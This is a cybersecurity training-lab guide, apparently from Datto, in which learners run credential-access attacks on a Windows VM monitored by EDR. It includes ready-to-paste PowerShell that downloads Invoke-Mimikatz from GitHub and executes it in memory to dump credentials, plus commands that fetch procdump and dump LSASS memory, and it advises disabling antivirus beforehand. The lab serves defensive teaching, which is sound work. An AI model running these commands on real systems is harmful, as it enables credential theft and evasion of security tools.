---
Title: ATT&CK - Credential Access & Exfiltration Phase
Description: Introduce post-compromise attack behaviors and EDR defenses
Author: Chris Gerritz, Datto
Created: 04/14/2025
Achievements:
Duration: 10
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
- Office
- Adobe Reader
External:
- attack.mitre.org
- allitshop.infocyte.com
- raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
- live.sysinternals.com/procdump.exe
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. We will perform post-compromise behaviors that an attacker would run once they compromised a system within the network.  This system has Datto EDR installed for monitoring so we will be able to view these commands from the defender's perspective as well.

Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals

The virtual machine has some dummy users to mimic a specific type of workstation that might be found in a business enviroment:

Dummy users:
- Joe from Accounting: 
  - `net user joe Password1! /ADD /FULLNAME:"Joe - Accounting"`
- Samson from Accounting
  - `net user samson Password1! /ADD /FULLNAME:"Samson - Accounting"`
- Brenda from IT
  - `net user brenda Password1! /ADD /FULLNAME:"Branda - IT Helpdesk"`

---

## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs: KNOWLEDGE,UNDERSTAND, APPLY, ANALYZE, EVALUATE, CREATE
- https://www.teachthought.com/critical-thinking/blooms-taxonomy-verbs-2/
-->
1. Understand the Credential Access phase of an attack
2. Demonstrate the use of common tools for stealing passwords
   

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |


## Instructions

Open a new terminal using `c:\Users\Public\rat.exe` or you can use the same terminal from the previous lab. You will be copying and pasting the lab commands into this terminal session.  If you close this window, remember to re-open `c:\Users\Public\rat.exe` before running any of the labs.

w> All labs require you to be running as an administrator. 


### 1. Credential Dumping with Mimikatz
> *Mimikatz is one of the most well known credential access and dumping tools used by hackers today. It can extract passwords, unencode them and sometimes unencrypt them.*

w> Mimikatz almost always will flag on antivirus so it's important to disable antivirus tools prior to running it.

Execute a **Credential Dump with Mimikatz**. 
- MITRE ATT&CK Technique: [ATT&CK T1003 - Credential Access - Credential Dumping](https://attack.mitre.org/techniques/T1003)
- Copy and paste this command into the terminal:
	```PowerShell
	# Mimikatz
	Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
	$MimikatzURL = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'
	$cmd = "IEX (New-Object Net.WebClient).DownloadString('$MimikatzURL'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"
	powershell.exe -command $cmd
	```



### 2. Credential Dumping with procdump.exe
> *Because Mimikatz is so commonly found by antivirus, some attackers will use built-in windows utilities to dump the memory of the security process, LSASS.exe, and then use mimikatz on the dump following exfiltration.*

Execute a **Credential Dump with Procdump**. 
- MITRE ATT&CK Technique: [ATT&CK T1003 - Credential Access - Credential Dumping](https://attack.mitre.org/techniques/T1003)
- Copy and paste this command into the terminal:
	```PowerShell
	# Extract LSASS memory with Procdump
	Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
	Write-Host -ForegroundColor Cyan  "Downloading ProcDump.exe"
	Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$Env:temp\procdump.exe"
	Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
	& "$Env:temp\procdump.exe" -ma lsass.exe lsass.dmp -accepteula
	```
